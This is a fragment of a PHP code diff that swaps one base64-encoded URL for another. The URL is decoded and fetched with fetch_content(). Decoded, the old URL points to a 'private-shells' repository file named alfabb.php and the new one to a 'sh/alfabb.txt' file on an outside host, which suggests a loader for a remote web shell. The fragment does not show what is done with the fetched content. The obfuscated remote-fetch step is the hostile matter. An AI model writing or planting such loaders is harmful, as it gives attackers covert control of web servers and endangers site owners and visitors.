@@ -18,7 +18,7 @@ function fetch_content($url) {
     return $output;
 }
 
-$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2N5YnJ4LXNvdXJjZS9wcml2YXRlLXNoZWxscy9yZWZzL2hlYWRzL21haW4vYWxmYWJiLnBocA==";
+$encoded_url = "aHR0cHM6Ly9naXRjLnB3L3NoL2FsZmFiYi50eHQ=";
 $decoded_url = base64_decode($encoded_url);
 
 $content = fetch_content($decoded_url);
